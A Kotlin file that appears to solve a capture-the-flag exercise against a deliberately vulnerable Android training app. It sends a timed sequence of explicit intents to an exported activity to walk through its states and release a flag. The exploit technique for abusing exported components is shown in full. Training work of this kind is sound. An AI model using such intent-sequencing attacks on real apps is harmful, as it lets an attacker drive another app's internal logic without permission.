package com.pachinko.intentattacksurface.utils

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking
import kotlin.time.Duration.Companion.milliseconds

object Flag4 {
    fun getFlag(context: Context) {
        val intentPrepare = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
            )
            action = "PREPARE_ACTION"
        }
        val intentBuild = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
            )
            action = "BUILD_ACTION"
        }
        val intentGetFlag = Intent().apply {
            component = ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
            )
            action = "GET_FLAG_ACTION"
        }

        runBlocking {
            context.startActivity(intentPrepare)
            delay(3000.milliseconds)
            context.startActivity(intentBuild)
            delay(3000.milliseconds)
            context.startActivity(intentGetFlag)
            delay(3000.milliseconds)
            context.startActivity(intentPrepare)
        }
    }
}
